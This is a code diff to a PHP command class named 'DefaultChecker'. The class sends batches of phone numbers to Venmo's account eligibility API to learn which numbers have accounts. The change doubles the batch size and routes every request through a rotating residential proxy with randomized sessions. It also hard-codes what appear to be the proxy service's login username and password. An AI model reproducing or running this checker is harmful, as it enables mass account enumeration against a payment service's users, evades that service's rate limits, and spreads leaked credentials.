@@ -57,12 +57,19 @@ class DefaultChecker extends Command
                 )
             )->map(
                 fn ($item) => str($item)->replace(["\r", "\n"], '')
-            )->chunk(10)->each(
+            )->chunk(20)->each(
                 function ($lists) use (&$client, $csrf) {
                     collect($lists)
                         ->map(
                             function ($list) use (&$client, $csrf) {
+
+                                //
+                                $username = 'lum-customer-c_9197a4c2-zone-venmo-country-us-session-'.md5(mt_rand().'_'.mt_rand().'_'.time());
+                                $password = 'c5j6tw1bku0m';
+                                $proxy = 'http://'.$username.':'.$password.'@zproxy.lum-superproxy.io:22225';
+
                                 return $client->postAsync('https://account.venmo.com/api/eligibility', [
+                                    'proxy' => $proxy,
                                     'json' => [
                                         'targetType' => 'phone',
                                         'targetId' => $list,
